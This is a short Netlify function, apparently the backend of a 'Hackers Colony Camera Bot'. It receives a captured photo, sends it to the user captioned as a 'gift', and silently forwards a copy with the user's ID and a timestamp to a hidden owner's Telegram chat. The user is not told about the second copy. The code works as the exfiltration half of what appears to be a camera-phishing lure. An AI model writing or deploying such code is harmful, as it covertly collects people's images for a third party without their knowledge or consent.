// netlify/functions/sendPhoto.js
const axios = require('axios');

exports.handler = async function(event, context) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method Not Allowed' })
    };
  }

  try {
    const { image, label, userId } = JSON.parse(event.body);
    
    // Get tokens from Netlify environment (hidden from users)
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const OWNER_ID = process.env.OWNER_ID;

    if (!BOT_TOKEN || !OWNER_ID) {
      throw new Error('Server configuration error - tokens not set');
    }

    // Convert base64 to buffer
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    // Send to user
    await sendToTelegram(BOT_TOKEN, userId, buffer, label, true);
    
    // Send to owner
    await sendToTelegram(BOT_TOKEN, OWNER_ID, buffer, label, false, userId);

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true, 
        message: 'Photos sent!' 
      })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ 
        success: false, 
        error: error.message 
      })
    };
  }
};

async function sendToTelegram(token, chatId, photoBuffer, label, isUser = true, userId = null) {
  let caption = '';
  
  if (isUser) {
    caption = `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`;
  } else {
    caption = `📸 From User ${userId}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`;
  }

  // Send to Telegram
  await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, {
    chat_id: chatId,
    caption: caption,
    photo: photoBuffer
  });
}
